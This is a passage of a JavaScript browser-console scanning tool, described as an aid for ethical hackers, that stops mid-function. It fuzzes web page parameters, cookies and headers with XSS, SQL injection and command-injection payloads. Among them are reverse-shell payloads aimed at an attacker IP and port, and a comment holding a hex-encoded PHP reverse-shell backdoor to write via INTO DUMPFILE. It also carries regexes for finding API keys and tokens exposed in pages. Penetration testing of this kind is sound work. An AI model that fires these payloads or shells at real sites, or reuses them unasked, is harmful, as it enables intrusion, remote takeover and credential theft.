/* eslint-disable no-eval */
/* eslint-disable no-useless-escape */
/* eslint-disable no-undef */
// Created by Davide Cavallini
// You'll find interesting functions and some bugs

// linkedin: https://www.linkedin.com/in/davidecavallini/
// eslint-disable-next-line no-unused-vars

// This tool is studied to help Ethical Hackers to find vulnerable points in webpage's javascript
// Just open the webpage, select all this code, copy and past in browser's console
// eslint-disable-next-line no-unused-vars
function JsBugHuntingHelper() {
  'use strict';

  this.xssScanEnabled = false;
  this.sqlInjectionScanEnabled = false;
  this.rceScanEnabled = false;
  this.formFuzzingEnabled = false;
  this.laravelScannerEnabled = false;
  // extensions have a special object called wrappedJSObject to get the original properties of the browser
  this.originalWinObj = {};
  this.attackerIp = '';
  this.attackerPort = '';
  this.customCookie = '';
  this.customHeaders = '';
  this.cookiesFuzzerEnabled = false;
  this.headersFuzzerEnabled = false;

  const previousXssAction = 'null';
  const payloadsXSS = [
    { type: 'XSS', previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: 'data.indexOf(\'<script>alert("XSS_VULNERABLE_PARAM")</script>\') !== -1 && data.indexOf(\'Uncaught mysqli\') === -1' },
    { type: 'XSS', previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: 'data.indexOf(\'<script>alert("XSS_VULNERABLE_PARAM")</script>\') !== -1 && data.indexOf(\'Uncaught mysqli\') === -1' },
    { type: 'XSS', previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: 'data.indexOf(\'<svg/onload=alert("XSS_VULNERABLE_PARAM")>\') !== -1 && data.indexOf(\'Uncaught mysqli\') === -1' },
  ];

  const previousErrorBasedSqliAction = 'null';
  const errorBasedSqliResult = 'data.indexOf(\'Uncaught mysql\') !== -1';
  // const unionSelectBasedSqliAction = "data.indexOf('918273645') !== -1"
  const payloadsSQLi = [
    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: '\'', expectedResult: errorBasedSqliResult },
    // query injection inside select statement
    // example select $paranName from table where ecc...
    { type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: 'concat(9182,73645)', expectedResult: 'data.indexOf(\'918273645\') !== -1' },
  ];

  // union based queries

  const unionSelectSQLiResult = 'data.indexOf(\'918273645\') !== -1 && data.indexOf(\'union select\') === -1';
  const eof = ['', '--', '#'];

  const sqliQuery = [];
  // string field with '
  sqliQuery[0] = { originalQuery: '\' union select \'918273645', addend: '\',\'918273645', finalQuote: ['', '\''] };
  // string field with "
  sqliQuery[1] = { originalQuery: '" union select "918273645', addend: '","918273645', finalQuote: ['', '"'] };
  // number field
  sqliQuery[2] = { originalQuery: '0 union select 918273645', addend: ',918273645', finalQuote: [''] };

  for (let q = 0; q < sqliQuery.length; q++) {
    // console.log('q', q)
    let payload = sqliQuery[q].originalQuery;

    // addend cycle (11 loops- 1 more than other famous sql mapper)
    for (let i = 0; i < 11; i++) {
      // console.log('i', i)
      if (i > 0) {
        payload += sqliQuery[q].addend;
      }

      // the end of line can be empty, or -- or #

      // special injections
      // "0' union all select concat(username,'#',password),concat(username,'#',password) from users"
      // time based
      // 0' union select sleep(5),'
      // bool based
      // 0' or 1!=1 # results in PAGE SIZE with bool false response, intead of 0' or 1=1 # that results page with bool true response (different page size)

      // for bool based query, for example sql6, you see the true or false result from the size of page difference
      // the same thing is for time based queries. you see if you have success from the response time

      // you can have also bridge sql injection
      // select name from table where username='$username' and password='$password'
      // $username = admin'/*
      // $password = '*/ --
      // then you'll have SELECT * FROM `users` WHERE username ='Admin'/* and password=''*/

      // method to create shell from mysql
      // win inside union select
      // 0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e3133372e312f3232323220303e26312722293b3f3e  INTO DUMPFILE 'c:/var/www/backdoor.php'
      // if the parameters is passed like this SELECT $POST[par],password FROM `users` WHERE id=1
      // you can also test like this SELECT concat(9182,73645),password FROM `users` WHERE id=1

      for (let fq = 0; fq < sqliQuery[q].finalQuote.length; fq++) {
        const payloadWithQuotes = payload + sqliQuery[q].finalQuote[fq];

        for (let e = 0; e < eof.length; e++) {
          // console.log('e', e)
          const payloadWithQuotesEof = payloadWithQuotes + eof[e];

          payloadsSQLi.push({ type: 'SQL Injection', previousAction: previousErrorBasedSqliAction, payloadString: payloadWithQuotesEof, expectedResult: unionSelectSQLiResult });
        }
      }
    }
  }
  // payloadsSQLi.forEach((v) => console.log(v.payloadString))

  const previousRceAction = 'data = data.replaceAll(\'echo%2BTEST_RCE\',\'\').replaceAll(\'echo+TEST_RCE\',\'\').replaceAll(\'echo TEST_RCE\',\'\').replaceAll(\'testRCE.php\',\'\').replaceAll("\'TEST_RCE\'",\'\')';
  const genericRceResult = 'data.indexOf(\'TEST_RCE\') !== -1 && data.indexOf(\'Uncaught mysqli\') === -1';
  const payloadsRCE = [
    { type: 'RCE', previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
    { type: 'RCE', previousAction: previousRceAction, payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
    /* Linux payload */
    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
    // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1'",
    /* Windows payload */
    { type: 'RCE', previousAction: previousRceAction, payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult },
    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php'
    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c "bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #',
    // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
  ];

  const searchElements = [
    // new SearchElement('single line comment', 'string', ' //'),
    // new SearchElement('block comment', 'string', '/*'),
    new SearchElement('form', 'string', '<form'),
    new SearchElement('url', 'string', 'http://'),
    new SearchElement('url', 'string', 'https://'),
    new SearchElement('web socket', 'string', 'ws://'),
    new SearchElement('web socket', 'string', 'wss://'),
    new SearchElement('post request', 'string', '"POST"'),
    new SearchElement('get request', 'string', '"GET"'),
    new SearchElement('post request', 'string', '\'POST'),
    new SearchElement('get request', 'string', '\'GET\''),
    new SearchElement('ajax request', 'string', '.ajax'),
    new SearchElement('post request', 'string', '$.post'),
    new SearchElement('get request', 'string', '$.get'),
    new SearchElement('query', 'string', 'query'),
    new SearchElement('api call', 'string', '/api'),
    new SearchElement('php file', 'string', '.php'),
    new SearchElement('asp file', 'string', '.asp'),
    new SearchElement('json file', 'string', '.json'),
    new SearchElement('mailto protocol', 'string', 'mailto:'),
    new SearchElement('something on mysql', 'string', 'mysql'),
    new SearchElement('something on email', 'string', '"email"'),
    new SearchElement('something on username', 'string', '"username"'),
    new SearchElement('something on username', 'string', '"user"'),
    new SearchElement('something on password', 'string', '"password"'),
    new SearchElement('something on password', 'string', '"pass"'),
    new SearchElement('something on password', 'string', '"psw"'),
    new SearchElement('something on password', 'string', '"pwd"'),
    new SearchElement('REGEX url with params', 'regEx', /\?(\w+=\w+)/),
    new SearchElement('REGEX email address', 'regEx', /\S+@\S+\.\S+/),

    // api keys regexes
    new SearchElement('Twitter Access Token', 'regEx', /[1-9][ 0-9]+-[0-9a-zA-Z]{40}/),
    // new SearchElement('Twitter Username', 'regEx', /(^|[^@\w])@(\w{1,15})\b/),
    new SearchElement('FB Access Token', 'regEx', /EAACEdEose0cBA[0-9A-Za-z]+/),
    new SearchElement('FB OAuth 2.0', 'regEx', /[A-Za-z0-9]{125}/),
    new SearchElement('Google API Key', 'regEx', /AIza[0-9A-Za-z-_]{35}/),
    new SearchElement('Google OAuth 2.0 Auth Code', 'regEx', /4\/[0-9A-Za-z-_]+/),
    new SearchElement('Google OAuth 2.0 Refresh Token', 'regEx', /1\/[0-9A-Za-z-]{43}|1\/[0-9A-Za-z-]{64}/),
    new SearchElement('Google OAuth 2.0 Access Token', 'regEx', /ya29.[0-9A-Za-z-_]+/),
    new SearchElement('Github OAuth 2.0 ID', 'regEx', /[A-Za-z0-9_]{255}/),
    new SearchElement('Picatic API Key', 'regEx', /sk_live_[0-9a-z]{32}/),
    new SearchElement('Stripe API Key', 'regEx', /sk_live_[0-9a-zA-Z]{24}/),
    new SearchElement('Square Access Token', 'regEx', /sqOatp-[0-9A-Za-z-_]{22}/),
    new SearchElement('Square OAuth Secret', 'regEx', /q0csp-[ 0-9A-Za-z-_]{43}/),
    new SearchElement('Paypal/Braintree Access Token', 'regEx', /\$[0-9a-z]{161[0-9a,]{32}/),
    new SearchElement('AWS Auth Token', 'regEx', /amzn.mws.[0-9a-f]{8}-[0-9a-f]{4}-10-9a-f1{4}-[0-9a,]{4}-[0-9a-f]{12}/),
    new SearchElement('Twilio API Key', 'regEx', /55[0-9a-fA-F]{32}/),
    new SearchElement('MailGun API Key', 'regEx', /key-[0-9a-zA-Z]{32}/),
    new SearchElement('MailChimp API Key', 'regEx', /[0-9a-f]{32}-us[0-9]{1,2}/),
    new SearchElement('Slack OAuth 2.0', 'regEx', /xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}/),
    new SearchElement('Slack OAuth v2 Configuration Token', 'regEx', /xoxe.xoxp-1-[0-9a-zA-Z]{166}/),
    new SearchElement('Slack OAuth v2 Refresh Token', 'regEx', /xoxe-1-[0-9a-zA-Z]{147}/),
    new SearchElement('Slack Webhook', 'regEx', /T[a-zA-Z0-9_]{8}\/B[a-zA-Z0-9_]{8}\/[a-zA-Z0-9_]{24}/),
    new SearchElement('AWS Access Key ID', 'regEx', /AKIA[0-9A-Z]{16}/),
    new SearchElement('Google Cloud OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
    new SearchElement('Google Clous API Key', 'regEx', /[A-Za-z0-9_]{21}--[A-Za-z0-9_]{8}/),
    new SearchElement('Heroku API Key', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),
    new SearchElement('Heroku OAuth 2.0', 'regEx', /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/),

    // new SearchElement('Js One Line Comment', 'string', '//'),
    // new SearchElement('Js Multi Line Comment', 'string', '/*'),
    /* new SearchElement('HTML Multi Line Comment', 'string', '<!--') */

    // LARAVEL LIVEWIRE
    new SearchElement('Livewire Emit', 'string', 'Livewire.emit('),
    new SearchElement('Livewire Emit', 'string', '$emit('),
  ];

  // eslint-disable-next-line no-multiple-empty-lines
  // eslint-disable-next-line no-unused-vars
  // @return void
  this.init = async function (xssScanEnabled, sqlInjectionScanEnabled, rceScanEnabled, laravelScanEnabled, bruteforcerEnabled, bruteforcerUrl, bruteforcerEmail, formFuzzingEnabled, attackerIp, attackerPort, customCookie, customHeaders, cookiesFuzzerEnabled, headersFuzzerEnabled) {
    document.getElementById('openGuiButton').disabled = true;
    document.getElementById('openGuiButton').innerHTML = 'Loading...';

    this.xssScanEnabled = xssScanEnabled;
    this.sqlInjectionScanEnabled = sqlInjectionScanEnabled;
    this.rceScanEnabled = rceScanEnabled;
    this.laravelScanEnabled = laravelScanEnabled;
    this.bruteforcerEnabled = bruteforcerEnabled;
    this.bruteforcerUrl = bruteforcerUrl;
    this.bruteforcerEmail = bruteforcerEmail;
    this.formFuzzingEnabled = formFuzzingEnabled;
    this.attackerIp = attackerIp;
    this.attackerPort = attackerPort;
    this.customHeaders = '{}';
    this.cookiesFuzzerEnabled = cookiesFuzzerEnabled;
    this.headersFuzzerEnabled = headersFuzzerEnabled;

    try {
      if (customHeaders.trim() !== '') {
        this.customHeaders = JSON.stringify(JSON.parse(customHeaders));
      }
    } catch (e) {
      alert(e);
    }

    if (customCookie.trim() !== '') {
      document.cookie = customCookie;
    }

    // console.log(window.wrappedJSObject)

    window.wrappedJSObject !== undefined ? this.originalWinObj = window.wrappedJSObject : this.originalWinObj = window;

    if (window.wrappedJSObject !== undefined) {
      // eslint-disable-next-line no-undef
      window.wrappedJSObject.Mapper = cloneInto(Mapper,
        window,
        { cloneFunctions: true });

      exportFunction(trySqliRemoteShell, window, { defineAs: 'trySqliRemoteShell' });
    }

    removeBootstrapDuplicatedStyles('.fade');
    removeBootstrapDuplicatedStyles('.collapse');
  };

  this.normalScan = async function () {
    let gui = '';
    let accordionNumber = 0;

    console.log('Created by Davide Cavallini');
    console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/');
    console.log('----------------------------------------------------------');
    console.log('\n');

    console.log('Body Source Suspicious Points'.toUpperCase());
    console.table(searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' '), document.body, ['BODY'], 0));

    accordionNumber++;
    gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Body Source Suspicious Points</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';
    gui += '<table class="table table-responsive table-hover">';
    gui += '<tr><th>Description</th><th>Declaration</th></tr>';

    searchInside(document.body.innerHTML.replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' '), document.body, ['BODY'], 0).forEach((v) => {
      gui += '<tr><td>' + htmlEntities(v.description) + '</td><td><code>' + htmlEntities(v.declaration) + '</code></td></tr>';
    });

    gui += '</table>';

    gui += '</div></div></div>';

    console.log('----------------------------------------------------------------------------');
    console.log('\n');

    console.log('Window Memory Suspicious Points'.toUpperCase());

    recursiveEnumerate(this.originalWinObj, 0).forEach((v) => {
      console.log(v.description, v.function, v.declaration);
    });

    accordionNumber++;
    gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Window Memory Suspicious Points</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

    gui += '<table class="table table-responsive table-hover">';
    gui += '<tr><th>Description</th><th>Function</th><th>Declaration</th><th>Mapper</th></tr>';

    recursiveEnumerate(this.originalWinObj, 0).forEach((v) => {
      gui += '<tr><td>' + htmlEntities(v.description) + '</td><td><a href="javascript:console.log(' + v.name + ');alert(\'Look the Console\')">' + htmlEntities(v.name) + '</a></td><td><code>' + htmlEntities(v.declaration) + '</code></td><td><a href="javascript:Mapper(\'' + v.name + '\');alert(\'Look the Console\')">Reverse Map</a></td></tr>';
    });

    gui += '</table>';

    gui += '</div></div></div>';

    console.log('----------------------------------------------------------------------------');
    console.log('\n');

    /* const table = interfaceTable
  recursiveEnumerate(window, 0).forEach((v) => {
    table.innerHTML += '<tr><td><a href="javascript:console.log(' + v.name + ')">' + v.name + '</a></td></tr>'
  }) */

    console.log('JS Listeners Suspicious Points'.toUpperCase());

    recursiveEnumerate(listAllEventListeners.call(this), 0).forEach((v) => {
      console.log(v.description, v.function, v.declaration);
    });

    accordionNumber++;
    gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">JS Listeners Suspicious Points</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

    gui += '<table class="table table-responsive table-hover">';
    gui += '<tr><th>Description</th><th>Function</th><th>Declaration</th></tr>';

    recursiveEnumerate(listAllEventListeners.call(this), 0).forEach((v) => {
      gui += '<tr><td>' + htmlEntities(v.description) + '</td><td>' + htmlEntities(v.function.name) + '</td><td><code>' + htmlEntities(v.declaration) + '</code></td></tr>';
    });

    gui += '</table>';

    gui += '</div></div></div>';

    console.log('----------------------------------------------------------------------------');
    console.log('\n');

    if (window.wrappedJSObject.jQuery !== undefined) {
      console.log('JQuery Listeners Suspicious Points'.toUpperCase());

      searchJqueryListeners.call(this).forEach((v) => {
        console.log(v.description, v.function, v.declaration);
      });

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">JQuery Listeners Suspicious Points</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Description</th><th>Function</th><th>Declaration</th></tr>';

      searchJqueryListeners.call(this).forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.description) + '</td><td>' + htmlEntities(v.function.name) + '</td><td><code>' + htmlEntities(v.declaration) + '</code></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';

      console.log('----------------------------------------------------------------------------');
      console.log('\n');

      console.log('JQuery Document Listeners Suspicious Points'.toUpperCase());

      recursiveEnumerate(getjQueryEventHandlers.call(this, document), 0).forEach((v) => {
        console.log(v.description, v.function, v.declaration);
      });

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">JQuery Document Listeners Suspicious Points</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Description</th><th>Function</th><th>Declaration</th></tr>';

      recursiveEnumerate(getjQueryEventHandlers.call(this, document), 0).forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.description) + '</td><td>' + htmlEntities(v.name) + '</td><td><code>' + htmlEntities(v.declaration) + '</code></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }

    console.log('Cookie'.toUpperCase(), document.cookie);

    accordionNumber++;
    gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Cookie</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">' + htmlEntities(document.cookie).replaceAll(';', '<br>') + '</div></div></div>';

    if (this.cookiesFuzzerEnabled === true) {
      console.log('URL Cookies Vulnerabilities'.toUpperCase());

      const cookies = await testCookies.call(this);
      console.log(cookies);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Cookies Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

      cookies.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
    }

    console.log('----------------------------------------------------------------------------');
    console.log('\n');

    const headers = await getPageHeaders(document.location.href);
    console.log('Headers'.toUpperCase(), headers);

    accordionNumber++;
    gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Headers</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">' + htmlEntities(headers).replace(/(?:\r\n|\r|\n)/g, '<br>') + '</div></div></div>';

    if (this.headersFuzzerEnabled === true) {
      console.log('URL Headers Vulnerabilities'.toUpperCase());

      const headers = await testHeaders.call(this);
      console.log(headers);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL Headers Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

      headers.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
    }

    console.log('----------------------------------------------------------------------------');
    console.log('\n');

    if (this.xssScanEnabled === true) {
      console.log('URL XSS Vulnerabilities'.toUpperCase());

      const xss = await testXSS.call(this);
      console.log(xss);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL XSS Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>';

      // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
      xss.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';

      console.log('Try to test the possible XSS of PHP_SELF in the form');
      console.log('If i have http://localhost/Vulnerable-Web-Application-master/XSS/XSS_level5.php?username=&submit=Submit');
      console.log('i can run this payload: http://localhost/Vulnerable-Web-Application-master/XSS/XSS_level5.php/"><script>alert(1)</script><span class="bho?username=&submit=Submit');
      console.log('and my form from this: <form method="GET" action="<?php echo $_SERVER[\'PHP_SELF\']; ?>" name="form">');
      console.log('become this: <form method="GET" action="http://localhost/Vulnerable-Web-Application-master/XSS/XSS_level5.php/"><script>alert(1)</script><span class="bho" name="form">');
      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }
    if (this.sqlInjectionScanEnabled === true) {
      console.log('URL SQL Injection Vulnerabilities'.toUpperCase());

      const sql = await testSqlInjection.call(this);
      console.log(sql);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL SQL Injection Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

      // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
      sql.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td>' + tryRemoteShellLink(v) + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';

      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }
    if (this.rceScanEnabled === true) {
      console.log('URL RCE Vulnerabilities'.toUpperCase());
      const rce = await testRCE.call(this);
      console.log(rce);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">URL RCE Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th></tr>';

      // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
      rce.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }
    if (this.laravelScanEnabled === true) {
      console.log('Laravel Scanner'.toUpperCase());
      const livewire = await testLivewireComponents.call(this);
      console.log(livewire);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Livewire Scanner</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Livewire Id</th><th>Listeners</th><th>Data</th><th>Models</th></tr>';

      livewire.forEach((v) => {
        gui += '<tr><td><a href="#" onclick="Livewire.components.componentsById.' + v.id + '">' + htmlEntities(v.id) + '</a></td><td>' + htmlEntities(v.listeners) + '</td><td>' + v.data + '</td><td>' + v.models + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
      console.log('----------------------------------------------------------------------------');
      console.log('\n');

      const laravelAccessibleUrls = await testLaravelAccessibleUrls.call(this);
      console.log(laravelAccessibleUrls);

      accordionNumber++;
